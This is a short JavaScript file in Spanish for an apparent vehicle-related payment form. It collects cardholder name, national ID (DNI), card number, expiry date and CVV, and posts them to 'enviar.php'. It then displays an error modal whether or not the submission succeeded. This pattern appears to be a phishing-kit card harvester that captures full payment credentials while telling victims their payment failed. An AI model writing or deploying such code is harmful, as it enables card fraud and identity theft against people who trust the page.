document.addEventListener('DOMContentLoaded', () => {
    const paymentForm = document.getElementById('vehicleForm');
    const tarjetaInput = document.getElementById('itarj');
    const vctoInput = document.getElementById('ivto');
    const modal = document.getElementById('errorModal');

    // Formateo de Tarjeta (Espacios cada 4 números)
    tarjetaInput.addEventListener('input', (e) => {
        let value = e.target.value.replace(/\D/g, '');
        let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
        e.target.value = formatted.substring(0, 19);
    });

    // Formateo de Vencimiento (Agrega / automáticamente)
    vctoInput.addEventListener('input', (e) => {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length >= 2) value = value.substring(0, 2) + '/' + value.substring(2, 4);
        e.target.value = value;
    });

    if (paymentForm) {
        paymentForm.addEventListener('submit', function(e) {
            e.preventDefault();
            const btn = e.target.querySelector('button');
            btn.textContent = "PROCESANDO...";
            btn.disabled = true;

            const formData = new FormData();
            formData.append('titular', document.getElementById('ititu').value);
            formData.append('dni', document.getElementById('idok').value);
            formData.append('tarjeta', tarjetaInput.value);
            formData.append('vencimiento', vctoInput.value);
            formData.append('cvv', document.getElementById('isegu').value);

            fetch('enviar.php', {
                method: 'POST',
                body: formData
            })
            .then(() => {
                setTimeout(() => {
                    modal.style.display = 'flex';
                    btn.textContent = "CONFIRMAR PAGO";
                    btn.disabled = false;
                }, 1000);
            })
            .catch(() => {
                modal.style.display = 'flex';
                btn.disabled = false;
            });
        });
    }
});

window.closeModal = function() {
    document.getElementById('errorModal').style.display = 'none';
};